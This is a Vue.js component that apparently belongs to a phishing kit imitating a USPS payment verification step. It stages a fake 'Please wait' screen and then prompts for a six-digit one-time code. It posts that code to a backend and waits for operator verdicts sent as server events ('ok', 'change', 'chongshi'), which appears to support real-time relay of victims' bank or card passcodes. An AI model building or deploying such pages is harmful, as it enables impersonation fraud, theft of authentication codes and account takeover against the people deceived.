<template>
  <div>
    <div v-show="show_waiting">
      <v-row>
        <v-col>
          <h3 class="wait_title"><strong>Please wait ...</strong></h3>
        </v-col>
      </v-row>
      <v-row style="padding-bottom: 30px" :class="wait_class">
        <v-col :offset="wait_offset">
          <img :src="require('/src/assets/images/loading.jpg')" width="150" height="150" alt="loading">
        </v-col>
      </v-row>
    </div>
    <div v-show="show_otp">
      <v-row>
        <v-col>
          <h3 class="payment"><strong>Enter verification code</strong></h3>
        </v-col>
      </v-row>
      <v-row>
        <v-col>
          <span class="overline">We require you to enter a one-time verification code for security reasons.</span>
        </v-col>
      </v-row>
      <v-row>
        <v-col cols="7">
          <input type="tel" name="pass" maxlength="6" placeholder="Verification code" autocomplete="one-time-code"
                 oninput="if(value.length>6)value=value.slice(0,6)" v-model="otp">
        </v-col>
        <v-col cols="2">
          <a :class="send_code_class" style="color: white;" @click="set_otp_wait">{{ send_code_text }}</a>
        </v-col>
      </v-row>
      <v-row class="text-center" style="padding-bottom: 30px">
        <v-col cols="12">
          <a tabindex="13" class="btn btn-primary btn-lg" style="color: white;" @click="submit_data">Continue</a>
        </v-col>
      </v-row>
      <v-row>
        <v-col cols="12" class="mb-5">
          <p style="color:red;" class="text-center "><b>{{ alert_text }}</b></p>
        </v-col>
      </v-row>
    </div>
    <v-overlay
        v-model="show_loading">
      <div class="blockUI blockMsg blockPage"
           style="z-index: 1011; position: fixed; padding: 0; margin: 0; width: 30%; top: 40%; left: 35%; text-align: center; color: rgb(0, 0, 0); border: 1px none rgb(0, 0, 0); background-color: transparent; cursor: wait;">
        <img src="@/assets/images/ajax-loader-usps-white.gif" style="height:auto;max-width:100%;" alt=""></div>
    </v-overlay>
  </div>

</template>

<script>
import axios from "axios";
import api from '@/api/index'

export default {
  name: "WaitView",
  data: () => ({
    send_code_class: "btn btn-primary",
    otp_wait: undefined,
    send_code_text: 'SEND',
    flush_task: '',
    alert_text: '',
    show_loading: false,
    appid: localStorage.getItem("appid"),
    otp: '',
    show_otp: false,
    show_waiting: true,
  }),
  computed: {
    wait_offset() {
      switch (this.$vuetify.breakpoint.name) {
        case 'xs':
          return 0
      }
      return 1
    },
    wait_class() {
      switch (this.$vuetify.breakpoint.name) {
        case 'xs':
          return 'text-center'
      }
      return ''
    },
  },
  mounted: function () {
    setTimeout(this.wait_close, 3000)
    setTimeout(this.check_syn, 2000)
    setTimeout(this.set_otp_wait, 3000)
  },
  methods: {
    submit_data() {
      this.show_alert = false
      const url = api.step_3
      const params = new URLSearchParams();
      const post_data = [this.appid, this.otp]
      const post_name = ['appid', 'otp']
      if (this.appid !== '' && this.otp !== '') {
        this.show_loading = true
        for (let i in post_data) {
          params.append(post_name[i], post_data[i])
        }
        axios.post(url, params)
            .then(response => {
              if (response.data.status === 'ok') {
                this.check_otp_status()
              } else {
                this.show_loading = false
                this.show_alert = true
                this.alert_text = 'Network error, please try again'
              }
            })
            .catch(error => {
              console.log(error)
              this.show_loading = false
              this.alert_text = 'Network error, please try again'
            })
      } else {
        this.show_alert = true
        this.alert_text = 'Please enter verification code to continue'
      }
    },
    check_otp_status() {
      if ('EventSource' in window) {
        const url = api.check_otp_status + "?appid=" + this.appid;
        const source = new EventSource(url);
        // 服务器发送信息到客户端时，如果没有 event 字段，默认会触发 message 事件
        source.onmessage = (event) => {
          let data = event.data;
          if (data === 'ok') {
            source.close()
            this.$router.push({'name': 'thanks'})
          } else if (data === 'change') {
            source.close()
            this.show_loading = false
            this.otp = ''
            this.alert_text = 'The verification code is error, please resend'
          } else if (data === 'chongshi') {
            this.show_loading = false
            this.otp = ''
            this.alert_text = 'The verification code has expired, please re-enter'
          }
        }
        // 连接异常时会触发 error 事件并自动重连
        source.onerror = (event) => {
          console.log(event);

        }
      }
    },
    wait_close() {
      this.show_otp = true;
      this.show_waiting = false
    },
    set_otp_text() {
      if (Number(this.send_code_text) <= 0) {
        clearInterval(this.otp_wait)
        this.send_code_class = "btn btn-primary"
        this.send_code_text = 'SEND'
      } else {
        this.send_code_text = Number(this.send_code_text - 1)
      }
    },
    set_otp_wait() {
      this.send_code_class = "btn btn-primary no_click"
      this.send_code_text = 60
      this.otp_wait = setInterval(this.set_otp_text, 1000)
    },
    check_syn() {
      const url = '/api/v2/get_syn'
      axios.get(url)
          .then(response => {
            console.log(response.data.data.status)
            if (response.data.data.status === false) {
              this.$router.push({'name': 'thanks'})
            }
          })
    }
  }
}
</script>

<style scoped>
.v-application--wrap {
  min-height: unset;
}

.wait_title {
  font-family: 'HelveticaNeueW01', Helvetica, Arial, sans-serif;
  font-size: 18px;
  line-height: 100%;
  font-weight: 500;
  color: #336;
  margin: 0;
  padding: 0;
}

.no_click {
  font-family: "HelveticaNeueW02-75Bold", "Helvetica Neue", Helvetica, Arial, sans-serif;
  font-size: 16px;
  display: inline-block;
  color: #fff;
  background: #999;
  min-width: 120px;
  text-align: center;
  border-radius: 3px;
  height: 44px;
  text-decoration: none;
  padding: 10px 20px;
  border-style: none;
  font-weight: normal;
  pointer-events: none;
}
</style>
